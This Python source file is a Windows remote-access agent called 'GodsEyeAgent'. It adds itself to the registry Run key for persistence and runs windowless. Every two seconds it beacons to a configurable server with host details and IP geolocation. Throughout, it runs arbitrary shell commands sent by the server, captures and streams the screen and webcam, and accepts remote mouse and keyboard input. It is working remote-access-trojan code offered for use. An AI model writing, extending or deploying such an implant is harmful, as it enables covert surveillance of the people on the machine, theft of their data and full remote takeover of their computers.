import requests
import psutil
import platform
import socket
import json
import time
import subprocess
import mss
import os
import uuid
import cv2
import threading
from PIL import Image
import io
import sys
import tkinter as tk
from tkinter import simpledialog, messagebox
import winreg as reg
import pyautogui

# Configuration File
CONFIG_FILE = 'config.json'

def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                return json.load(f)
        except:
            return {}
    return {}

def save_config(config):
    with open(CONFIG_FILE, 'w') as f:
        json.dump(config, f)

def get_server_url():
    config = load_config()
    server_url = config.get('server_url')
    
    if not server_url:
        root = tk.Tk()
        root.withdraw()
        server_url = simpledialog.askstring("Input", "Enter Server URL (e.g., http://192.168.1.5:5000):", parent=root)
        if server_url:
            config['server_url'] = server_url
            save_config(config)
            messagebox.showinfo("Success", "Configuration saved! The agent will now run in the background.")
        else:
            sys.exit(0)
    
    return server_url

def add_to_startup():
    if getattr(sys, 'frozen', False):
        app_path = sys.executable
    else:
        python_exe = sys.executable
        pythonw_exe = python_exe.replace("python.exe", "pythonw.exe")
        script_path = os.path.abspath(__file__)
        app_path = f'"{pythonw_exe}" "{script_path}"'

    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_ALL_ACCESS)
        reg.SetValueEx(key, "GodsEyeAgent", 0, reg.REG_SZ, app_path)
        reg.CloseKey(key)
    except Exception as e:
        print(f"Failed to add to startup: {e}")

SERVER_URL = get_server_url()
HARDWARE_ID = str(uuid.getnode())

streaming_screen = False
streaming_cam = False
remote_control_active = True 

# Location Caching
cached_lat = 0.0
cached_lon = 0.0
last_location_time = 0
location_retry_after = 0

def get_location():
    global cached_lat, cached_lon, last_location_time, location_retry_after
    
    current_time = time.time()
    
    # Only refresh if cache is older than 1 hour AND we are past the retry interval if it failed
    if (current_time - last_location_time < 3600) or (current_time < location_retry_after):
        return cached_lat, cached_lon

    try:
        # Use ip-api.com (Free for non-commercial use, no API key required for basic)
        r = requests.get('http://ip-api.com/json/', timeout=5)
        if r.status_code == 200:
            data = r.json()
            cached_lat = data.get('lat', 0.0)
            cached_lon = data.get('lon', 0.0)
            last_location_time = current_time
            return cached_lat, cached_lon
        else:
            # On non-200, wait 10 mins before retrying
            location_retry_after = current_time + 600
    except:
        # On connection failure, wait 10 mins before retrying (silently)
        location_retry_after = current_time + 600
        
    return cached_lat, cached_lon

def get_system_info():
    lat, lon = get_location()
    return {
        'hardware_id': HARDWARE_ID,
        'hostname': socket.gethostname(),
        'os_info': f"{platform.system()} {platform.release()}",
        'cpu': psutil.cpu_percent(),
        'ram': psutil.virtual_memory().percent,
        'total_ram': round(psutil.virtual_memory().total / (1024 ** 3), 2),
        'disk': psutil.disk_usage('/').percent,
        'lat': lat, 
        'lon': lon
    }

def execute_command(command, command_id):
    global streaming_screen, streaming_cam, remote_control_active
    print(f"Executing: {command}")
    output = "Executed"
    try:
        print(f"Executing command [{command_id}]: {command}")
        if command == "SCREENSHOT" or command == "CAPTURE_SCREEN":
            upload_screenshot()
            output = "Screenshot uploaded."
        elif command == "CAPTURE_CAM":
            upload_cam_photo()
            output = "Camera photo uploaded."
        elif command == "START_STREAM_SCREEN":
            if not streaming_screen:
                streaming_screen = True
                threading.Thread(target=stream_screen_loop, daemon=True).start()
                output = "Screen streaming started."
            else:
                output = "Screen streaming already active."
        elif command == "STOP_STREAM_SCREEN":
            streaming_screen = False
            output = "Screen streaming stopped."
        elif command == "START_STREAM_CAM":
            if not streaming_cam:
                streaming_cam = True
                threading.Thread(target=stream_cam_loop, daemon=True).start()
                output = "Camera streaming started."
            else:
                output = "Camera streaming already active."
        elif command == "STOP_STREAM_CAM":
            streaming_cam = False
            output = "Camera streaming stopped."
        elif command == "ENABLE_CONTROL":
            remote_control_active = True
            output = "Remote control enabled."
        elif command == "DISABLE_CONTROL":
            remote_control_active = False
            output = "Remote control disabled."
        else:
            # Explicitly use shell=True for 'dir' and other built-ins
            result = subprocess.run(command, shell=True, capture_output=True, text=True)
            output = result.stdout + result.stderr
            if not output:
                output = "(No output from command)"
        
        print(f"Command [{command_id}] finished. Output size: {len(output)}")
    except Exception as e:
        output = f"Error: {str(e)}"
        print(f"Command [{command_id}] failed: {output}")

    try:
        r = requests.post(f"{SERVER_URL}/api/command/result", json={
            'command_id': command_id,
            'output': output
        }, timeout=10)
        print(f"Result for [{command_id}] sent to server. Status: {r.status_code}")
    except Exception as e:
        print(f"Failed to send result for [{command_id}]: {e}")

def upload_screenshot():
    with mss.mss() as sct:
        filename = sct.shot(mon=-1, output='monitor-1.png')
        with open('monitor-1.png', 'rb') as f:
            files = {'file': f}
            requests.post(f"{SERVER_URL}/api/upload_screen/{HARDWARE_ID}", files=files)
        os.remove('monitor-1.png')

def upload_cam_photo():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        _, img_encoded = cv2.imencode('.jpg', frame)
        files = {'file': ('cam.jpg', img_encoded.tobytes(), 'image/jpeg')}
        requests.post(f"{SERVER_URL}/api/upload_cam/{HARDWARE_ID}", files=files)
    cap.release()

def stream_screen_loop():
    global streaming_screen
    print("Starting screen stream loop...")
    try:
        with mss.mss() as sct:
            while streaming_screen:
                try:
                    # Use monitor 0 (all screens combined) which is more reliable
                    monitor = sct.monitors[0]
                    sct_img = sct.grab(monitor)
                    img = Image.frombytes("RGB", sct_img.size, sct_img.bgra, "raw", "BGRX")
                    
                    # Resize for better bandwidth performance
                    max_size = (1280, 720)
                    img.thumbnail(max_size, Image.Resampling.LANCZOS)
                    
                    img_byte_arr = io.BytesIO()
                    img.save(img_byte_arr, format='JPEG', quality=60) 
                    img_byte_arr = img_byte_arr.getvalue()
                    
                    files = {'file': ('stream.jpg', img_byte_arr, 'image/jpeg')}
                    try:
                        r = requests.post(f"{SERVER_URL}/api/upload_screen/{HARDWARE_ID}", files=files, timeout=2)
                        if r.status_code != 200:
                            print(f"Upload screen failed: {r.status_code}")
                    except requests.exceptions.Timeout:
                        # Skip if server is busy, try next frame
                        pass
                    except Exception as e:
                        print(f"Upload screen post error: {e}")
                    
                    time.sleep(0.15) # ~6-7 FPS target
                except Exception as e:
                    print(f"Screen capture error: {e}")
                    time.sleep(1)
    except Exception as e:
        print(f"MSS init error: {e}")
    print("Screen stream loop stopped.")

def stream_cam_loop():
    global streaming_cam
    print("Starting cam stream loop...")
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("Error: Could not open camera.")
        streaming_cam = False
        return

    while streaming_cam:
        try:
            ret, frame = cap.read()
            if ret:
                _, img_encoded = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 40])
                files = {'file': ('cam.jpg', img_encoded.tobytes(), 'image/jpeg')}
                try:
                    r = requests.post(f"{SERVER_URL}/api/upload_cam/{HARDWARE_ID}", files=files, timeout=2)
                    if r.status_code != 200:
                        print(f"Upload cam failed: {r.status_code}")
                except requests.exceptions.Timeout:
                    print("Upload cam timeout")
                except Exception as e:
                    print(f"Upload cam post error: {e}")
            else:
                print("Failed to capture cam frame")
            time.sleep(0.2)
        except Exception as e:
            print(f"Cam stream loop error: {e}")
            time.sleep(1)
    cap.release()
    print("Cam stream loop stopped.")

def control_poll_loop():
    global remote_control_active
    while True:
        if remote_control_active:
            try:
                resp = requests.get(f"{SERVER_URL}/api/control/pending/{HARDWARE_ID}", timeout=1)
                if resp.status_code == 200:
                    data = resp.json()
                    events = data.get('events', [])
                    screen_w, screen_h = pyautogui.size()
                    
                    for event in events:
                        etype = event.get('type')
                        if etype == 'mousemove':
                            # Server sends 0-1 relative coords
                            x = int(event['x'] * screen_w)
                            y = int(event['y'] * screen_h)
                            pyautogui.moveTo(x, y)
                        elif etype == 'click':
                            pyautogui.click()
                        elif etype == 'keydown':
                            key = event.get('key')
                            # PyAutoGUI key mapping handling might be needed depending on JS key codes
                            # For simplicity, pass direct characters or map specific ones
                            if len(key) == 1:
                                pyautogui.press(key)
                            elif key == 'Enter': pyautogui.press('enter')
                            elif key == 'Backspace': pyautogui.press('backspace')
                            elif key == 'ArrowUp': pyautogui.press('up')
                            elif key == 'ArrowDown': pyautogui.press('down')
                            elif key == 'ArrowLeft': pyautogui.press('left')
                            elif key == 'ArrowRight': pyautogui.press('right')
                            elif key == 'Space': pyautogui.press('space')
                            
            except Exception:
                pass
        time.sleep(0.2) # 5 polls per second

def main():
    add_to_startup()
    print(f"Agent Started. ID: {HARDWARE_ID}")
    
    # Start control thread
    threading.Thread(target=control_poll_loop, daemon=True).start()
    
    while True:
        try:
            data = get_system_info()
            response = requests.post(f"{SERVER_URL}/api/checkin", json=data)
            
            if response.status_code == 200:
                resp_data = response.json()
                commands = resp_data.get('commands', [])
                if commands:
                    print(f"Received commands: {commands}")
                for cmd in commands:
                    print(f"Spawning thread for: {cmd['command']}")
                    threading.Thread(target=execute_command, args=(cmd['command'], cmd['id'])).start()
            
        except Exception as e:
            print(f"Error: {e}")
        
        print(f"Agent Loop Heartbeat... ({time.ctime()})")
        time.sleep(2) 

if __name__ == '__main__':
    # Force unbuffered output for debugging
    if hasattr(sys.stdout, 'reconfigure'):
        sys.stdout.reconfigure(line_buffering=True)
    main()
